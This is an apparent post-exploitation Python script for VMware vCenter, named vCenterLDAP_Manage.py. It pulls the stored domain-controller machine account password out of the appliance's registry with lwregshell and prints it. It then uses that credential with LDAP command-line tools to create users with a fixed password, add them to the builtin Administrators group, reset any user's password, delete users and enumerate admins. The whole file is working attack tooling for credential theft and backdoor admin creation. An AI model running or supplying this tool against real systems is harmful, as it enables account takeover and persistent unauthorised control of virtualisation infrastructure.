#python3
import os
import sys
import re

def RunCommand(cmd):
    r = os.popen(cmd)
    text = r.read()
    r.close()
    return text


def GetLDAPConfig():
    print("[*] Try to get the config of LDAP")
    result = RunCommand("/opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\\services\\vmdir]'")

    index1 = result.find("dcAccount")
    dcAccount = result[index1:].split('\n')[0].split('"')[2]

    index2 = result.find("dcAccountDN")
    dcAccountDN = result[index2:].split('\n')[0].split('"')[2]
    
    index3 = result.find("dcAccountPassword")
    dcAccountPassword = result[index3:].split('\n')[0].split()[2][1:-1].replace('\\"', '"')
    
    print("[+] dcAccount: " + dcAccount)
    print("[+] dcAccountDN: " + dcAccountDN)
    print("[+] dcAccountPassword: " + dcAccountPassword)
    return dcAccount,dcAccountDN,dcAccountPassword


def AddUser():
    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()

    print("[*] Try to generate the ldif")
    print("Eg.")
    print("   username: test1")
    print("   dn: CN=test1,CN=Users,DC=aaa,DC=bbb")
    print("   userPrincipalName: test1@AAA.BBB")
      
    username = input("input the new username: ")
    dn = input("input the dn: ")
    userPrincipalName = input("input the userPrincipalName: ")

    ADDUSER = '''dn: {dn}
userPrincipalName: {userPrincipalName}
sAMAccountName: {username}
cn: {username}
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
userPassword: P@ssWord123@@
'''
    ADDUSER = ADDUSER.format(dn = dn, userPrincipalName = userPrincipalName, username = username) 

    print("[*] Confirm the ldif")
    print(ADDUSER)

    print("[*] Try to generate the ldif")
    fo = open("adduser.ldif", "w")
    fo.write(ADDUSER)
    fo.close()

    print("[*] Try to add the data")
    command = "ldapadd -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -f adduser.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
    print("[+] Command: " + command)
    result = RunCommand(command)
    print(result)

    print("[*] Try to clean the ldif")
    os.remove("adduser.ldif")
    print("\nAll done.")

    print("[+] New user: " + userPrincipalName)
    print("    Password: P@ssWord123@@")
    print("[!] Remember to add it as an admin")    


def AddAdmin():
    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()
    base = dcAccountDN.split('s,')[1]
    print("[*] Try to generate the ldif")
    print("Eg.")
    print("   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb")
      
    dn = input("input the user dn: ")

    ADDADMIN = '''dn: cn=Administrators,cn=Builtin,{base}
changetype: modify
add: member
member: {dn}
'''
    ADDADMIN = ADDADMIN.format(base = base, dn = dn) 

    print("[*] Confirm the ldif")
    print(ADDADMIN)

    print("[*] Try to generate the ldif")
    fo = open("addadmin.ldif", "w")
    fo.write(ADDADMIN)
    fo.close()

    print("[*] Try to modify the data")
    command = "ldapmodify -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -f addadmin.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
    print("[+] Command: " + command)
    result = RunCommand(command)
    print(result)

    print("[*] Try to clean the ldif")
    os.remove("addadmin.ldif")
    print("\nAll done.")


def ChangePass():
    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()

    print("[*] Try to generate the ldif")
    print("Eg.")
    print("   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb")
    print("   new password: P@ssWord123@@45")
      
    dn = input("input the user dn: ")
    newpassword = input("input the new password: ")

    CHANGEPASS = '''dn: {dn}
changetype: modify
replace: userPassword
userPassword: {newpassword}
'''
    CHANGEPASS = CHANGEPASS.format(dn = dn, newpassword = newpassword) 

    print("[*] Confirm the ldif")
    print(CHANGEPASS)

    print("[*] Try to generate the ldif")
    fo = open("changepass.ldif", "w")
    fo.write(CHANGEPASS)
    fo.close()

    print("[*] Try to modify the data")
    command = "ldapmodify -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -f changepass.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
    print("[+] Command: " + command)
    result = RunCommand(command)
    print(result)

    print("[*] Try to clean the ldif")
    os.remove("changepass.ldif")
    print("\nAll done.")
    print("[+] User: " + dn)    
    print("[+] New Password: " + newpassword)


def DeleteUser():
    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()

    print("[*] Try to input the user dn")
    print("Eg.")
    print("   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb")
    dn = input("input the user dn: ")

    print("[*] Try to delete the data")
    command = "ldapdelete -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' \"{dn}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, dn = dn)
    print("[+] Command: " + command)
    result = RunCommand(command)
    print(result)

    print("\nAll done.")


def GetAdmin():
    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()
    base = dcAccountDN.split('s,')[1]
    adminbase = "cn=Administrators,cn=Builtin," + base

    print("[*] Try to get the data")
    command = "ldapsearch -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -b \"{adminbase}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)
    print("[+] Command: " + command)
    result = RunCommand(command)
    print("[+] Admin User:")

    pattern_name = re.compile(r"member: (.*?),")
    name = pattern_name.findall(result)
    for i in range(len(name)):       
        print(" -  %s"%(name[i][3:]))

    print("\nAll done.")


def GetUser():
    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()
    base = dcAccountDN.split('s,')[1]
    adminbase = "cn=Users," + base

    print("[*] Try to get the data")
    command = "ldapsearch -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -b \"{adminbase}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)
    print("[+] Command: " + command)
    result = RunCommand(command)

    print("[+] User:")

    pattern_name = re.compile(r"dn: (.*?),")
    name = pattern_name.findall(result)
    for i in range(len(name)):       
        print(" -  %s"%(name[i][3:]))

    print("\nAll done.")


if __name__ == "__main__":

    if len(sys.argv)!=2:
        print("vCenterLDAP_Manage.py")
        print("Use to manage the LDAP database.")       
        print("Usage:")
        print("%s <mode>"%(sys.argv[0]))
        print("mode:")
        print("- adduser")        
        print("- addadmin")
        print("- changepass")
        print("- deleteuser")
        print("- getadmin")
        print("- getuser")

        print("Eg.")
        print("%s adduser"%(sys.argv[0]))      
        sys.exit(0)
    else:

        if sys.argv[1] == "adduser":  
            print("[*] Try to add a user")
            AddUser()

        elif sys.argv[1] == "addadmin":  
            print("[*] Try to add a user as an admin")
            AddAdmin()

        elif sys.argv[1] == "changepass":  
            print("[*] Try to change the password")
            ChangePass()

        elif sys.argv[1] == "deleteuser":  
            print("[*] Try to delete the user")
            DeleteUser()

        elif sys.argv[1] == "getadmin":  
            print("[*] Try to list the admin user")
            GetAdmin()

        elif sys.argv[1] == "getuser":  
            print("[*] Try to list the user")
            GetUser()

        else:
            print("[!] Wrong parameter")